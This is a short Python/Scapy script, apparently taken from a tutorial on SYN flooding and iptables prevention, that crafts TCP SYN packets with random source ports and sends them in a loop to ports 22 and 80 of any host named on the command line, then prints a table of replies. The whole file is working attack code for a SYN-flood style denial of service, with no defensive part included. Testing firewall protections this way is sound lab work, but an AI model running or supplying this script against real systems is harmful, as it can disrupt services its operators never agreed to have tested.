#! /usr/bin/env python
# Name : Subodh Pachghare
# CyberSpace Name : HaX0R (Cyberninja)
# Website : www.thesubodh.com
# Description : SYN Flood Packet creation for iptables prevention solution
# Source: https://www.opensourceforu.com/2011/10/syn-flooding-using-scapy-and-prevention-using-iptables/
import sys
from scapy.all import *
#conf.verb=0
print("Field Values of packet sent")
p=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
ls(p)
print("Sending Packets in 0.3 second intervals for timeout of 4 sec")
ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
print("Summary of answered & unanswered packets")
ans.summary()
unans.summary()
print("source port flags in response")
#for s,r in ans:
# print r.sprintf("%TCP.sport% \t %TCP.flags%")
ans.make_table(lambda s_r: (s_r[0].dst, s_r[0].dport, s_r[1].sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
